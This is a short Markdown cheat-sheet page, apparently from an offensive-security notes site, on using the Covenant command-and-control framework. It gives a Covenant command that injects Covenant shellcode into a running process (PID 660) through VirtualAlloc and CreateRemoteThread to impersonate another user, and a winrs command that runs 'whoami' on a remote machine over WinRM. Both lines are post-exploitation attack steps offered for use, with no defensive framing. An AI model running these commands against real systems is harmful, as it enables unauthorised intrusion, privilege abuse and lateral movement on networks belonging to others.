---
title: Covenant
parent: General Usage
layout: default
nav_order: 31
---

To impersonate another user using a process (assuming PID is 660). Need to inject COVENANT SHELLCODE (file extension is *.bin not BINARY which is *.exe):\
`Inject /processid:"660" /allocationtechnique:"VirtualAlloc" /executiontechnique:"CreateRemoteThread" /payloadtype:"PICPayload"`

Run command using winrm:\
`winrs -r:targetmachine.local "whoami"`